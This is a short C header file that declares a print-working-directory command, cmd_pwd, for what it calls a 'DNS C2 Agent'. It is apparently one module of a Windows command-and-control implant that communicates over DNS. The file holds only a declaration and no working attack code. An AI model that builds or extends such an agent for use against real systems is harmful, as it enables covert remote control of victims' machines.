/**
 * pwd.h - Print working directory command for DNS C2 Agent
 */

 #ifndef PWD_H
 #define PWD_H
 
 #include <windows.h>
 
 /**
  * Print the current working directory
  * 
  * @param args Unused
  * @return The result of the command (must be freed by caller)
  */
 char* cmd_pwd(const char* args);
 
 #endif // PWD_H
